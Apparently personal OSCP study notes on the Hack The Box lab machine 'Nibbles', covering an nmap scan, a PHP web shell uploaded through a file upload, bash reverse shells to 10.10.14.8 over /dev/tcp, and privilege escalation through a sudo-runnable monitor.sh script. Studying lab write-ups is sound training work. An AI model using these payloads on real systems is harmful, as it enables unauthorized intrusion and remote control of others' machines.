# Information gathering

## system network

10.10.10.75

## Nmap Scan Result

``` bash
PORT   STATE SERVICE VERSION                                                           
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)      
| ssh-hostkey:                                                                         
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)                        
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)                      
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                    
|_http-title: Site doesn't have a title (text/html).                                   
|_http-server-header: Apache/2.4.18 (Ubuntu)                                           
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Exploit

file upload 

![image-20221222152717789](D:\OSCP\hackthebox\attachments\image-20221222152717789.png)

*payload*

```php
<?php echo "Shell";system($_GET['cmd']); ?>
```

*webshell*

![image-20221222152827151](D:\OSCP\hackthebox\attachments\image-20221222152827151.png)

*Reverse Shell*

```bash
/bin/bash+-c+'/bin/bash+-i+>%26+/dev/tcp/10.10.14.8/6001+0>%261'
```



#### Proof

![image-20221222153441558](D:\OSCP\hackthebox\attachments\image-20221222153441558.png)

### Lateral Movement



### Privilege Escalation

```bash
sudo -l
```

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.8/6003 0>&1'
```

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```



#### proof

![image-20221222160502737](D:\OSCP\hackthebox\attachments\image-20221222160502737.png)